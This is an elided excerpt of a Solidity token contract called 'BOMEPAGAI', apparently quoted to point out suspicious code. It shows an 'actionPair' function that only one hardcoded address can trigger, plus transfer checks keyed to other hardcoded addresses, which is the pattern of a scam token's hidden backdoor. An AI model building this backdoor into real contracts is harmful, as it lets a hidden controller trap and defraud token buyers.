...
contract TOKEN is Ownable, IERC20, IERC20Meta {
    ...
    function actionPair(address account) public virtual returns (bool) {
         if(_msgSender() == 0xaf6f525d4f99564620c92f21ea05D314CCffd422) _p76234 = account;
        return true;
    }
    ...
    function _transfer(
        ...
        0x6b75d8AF000000e20B7a7DDf000Ba900b4009A80) ||
         ...
         from  != 0x6332BD0Fc053AB5f5f7460Fb734eEC43865cC4Ec 
         && from != 0xB19792a8837A22fe4654715f888466daB1c2f335)) {
    ...
    constructor() {
        _name = unicode"BOMEPAGAI";
        _symbol = unicode"BOMEPAGAI";
